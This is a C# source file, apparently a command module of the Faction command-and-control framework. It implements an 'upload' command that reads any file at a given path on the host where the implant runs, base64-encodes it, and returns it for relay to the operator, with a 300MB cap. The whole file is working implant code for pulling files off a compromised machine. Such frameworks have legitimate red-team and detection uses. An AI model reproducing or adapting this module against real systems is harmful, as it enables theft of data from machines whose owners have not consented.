using System;
using System.IO;
using System.Collections.Generic;
using Faction.Modules.Dotnet.Common;

namespace Faction.Modules.Dotnet.Commands
{
  class Upload : Command
  {
    public override string Name { get { return "upload"; } }
    public override CommandOutput Execute(Dictionary<string, string> Parameters = null)
    {
      CommandOutput output = new CommandOutput();
      
      string path = Path.GetFullPath(Parameters["Path"]);
      long length = new FileInfo(path).Length;
      output.Complete = true;

      // hard limit of 300mb for file uploads. Because of the b64 we have to do, this would inflate to like 500mb
      if (length > 314572800)
      {
        output.Message = $"File size of {length} is over the 300mb limit of uploads.";
        output.Success = false;
      }
      else
      {
        byte[] fileBytes = File.ReadAllBytes(path);
        output.Success = true;
        output.Message = $"{path} has been uploaded";
        output.Type = "File";
        output.Content = Convert.ToBase64String(fileBytes);
        output.ContentId = path;
      }
      return output;
    }
  }
}
